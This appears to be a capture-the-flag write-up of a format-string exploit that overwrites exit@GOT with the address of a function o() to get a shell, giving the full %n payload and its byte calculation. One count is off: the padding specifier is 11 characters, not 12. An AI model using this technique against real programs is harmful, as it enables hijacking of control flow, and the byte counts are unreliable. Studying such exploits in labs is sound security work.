--- The exploit strategy ---

Goal:
→ overwrite exit@GOT (0x08049838) with o() address (0x080484a4)
→ when program calls exit() → redirects to o() → shell

Using %n format specifier:
→ %n writes number of chars printed so far into an address
→ we need to write 0x080484a4 = 134513828 into 0x08049838

Using %[number]x trick:
→ instead of printing 134513828 literal chars (impossible)
→ use %134513824x → only 12 bytes in input
→ printf prints 134513824 chars worth of padding internally
→ fgets sees only 12 bytes → no problem ✅

--- Payload calculation ---

address at position 4 = 4 bytes already printed
need total chars:       134513828 (= 0x080484a4)
padding needed:         134513828 - 4 = 134513824

payload:
\x38\x98\x04\x08  → exit@GOT address in little endian (position 4)
%134513824x       → print 134513824 more chars → total = 134513828
%4$n              → write 134513828 into address at position 4
                  → exit@GOT now contains 0x080484a4 (o() address)

total input size: 4 + 12 + 4 = 20 bytes ✅ well under 512

